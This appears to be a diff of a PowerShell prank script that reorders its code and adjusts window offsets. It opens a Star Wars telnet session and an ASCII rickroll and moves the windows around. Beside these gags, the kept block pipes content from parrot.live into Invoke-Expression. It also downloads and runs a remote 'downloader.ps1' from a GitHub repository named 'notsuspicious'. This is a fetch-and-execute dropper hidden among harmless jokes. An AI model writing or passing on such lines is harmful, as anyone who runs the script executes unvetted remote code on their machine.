@@ -1,29 +1,3 @@
-# Find existing PowerShell window
-$psWindow = Get-Process -Name powershell | Where-Object { $_.MainWindowTitle -ne "" }
-
-if ($psWindow) {
-    # Start Star Wars in a new Command Prompt window to the left
-    Start-Process cmd -ArgumentList "/c start telnet towel.blinkenlights.nl" -WindowStyle Normal
-    # Start rickroll in ASCII in a new Command Prompt window to the right
-    Start-Process cmd -ArgumentList "/c start cmd /k curl -L http://artscene.textfiles.com/asciiart/musicsongs/nevergonna.txt" -WindowStyle Normal
-
-    # Move the Star Wars window 200px to the left of the PowerShell window
-    $leftPos = $psWindow.MainWindowLeft - 500
-    Move-Window -ProcessName "cmd" -Left $leftPos -Top $psWindow.MainWindowTop -Width 800 -Height 600
-
-    # Move the rickroll window 200px to the right of the PowerShell window
-    $rightPos = $psWindow.MainWindowLeft + $psWindow.MainWindowWidth + 500
-    Move-Window -ProcessName "cmd" -Left $rightPos -Top $psWindow.MainWindowTop -Width 800 -Height 600
-
-    # Curl parrot.live in the found PowerShell window
-    Invoke-Expression (curl parrot.live)
-
-    # Execute PowerShell command
-    Invoke-Expression (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/downloader.ps1" -UseBasicParsing).Content
-} else {
-    Write-Host "PowerShell window not found."
-}
-
 Function Move-Window {
     param (
         [string]$ProcessName,
@@ -56,4 +30,33 @@ Function Move-Window {
     } else {
         Write-Host "$ProcessName window not found."
     }
+}
+
+# Find existing PowerShell window
+$psWindow = Get-Process -Name powershell | Where-Object { $_.MainWindowTitle -ne "" }
+
+if ($psWindow) {
+    # Start Star Wars in a new Command Prompt window to the left
+    Start-Process cmd -ArgumentList "/c start telnet towel.blinkenlights.nl" -WindowStyle Normal
+    # Start rickroll in ASCII in a new Command Prompt window to the right
+    Start-Process cmd -ArgumentList "/c start cmd /k curl -L http://artscene.textfiles.com/asciiart/musicsongs/nevergonna.txt" -WindowStyle Normal
+
+    # Wait for a moment to let the windows start
+    Start-Sleep -Seconds 5
+
+    # Move the Star Wars window 200px to the left of the PowerShell window
+    $leftPos = $psWindow.MainWindowLeft - 200
+    Move-Window -ProcessName "cmd" -Left $leftPos -Top $psWindow.MainWindowTop -Width 800 -Height 600
+
+    # Move the rickroll window 200px to the right of the PowerShell window
+    $rightPos = $psWindow.MainWindowLeft + $psWindow.MainWindowWidth + 200
+    Move-Window -ProcessName "cmd" -Left $rightPos -Top $psWindow.MainWindowTop -Width 800 -Height 600
+
+    # Curl parrot.live in the found PowerShell window
+    Invoke-Expression (curl parrot.live)
+
+    # Execute PowerShell command
+    Invoke-Expression (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/downloader.ps1" -UseBasicParsing).Content
+} else {
+    Write-Host "PowerShell window not found."
 }
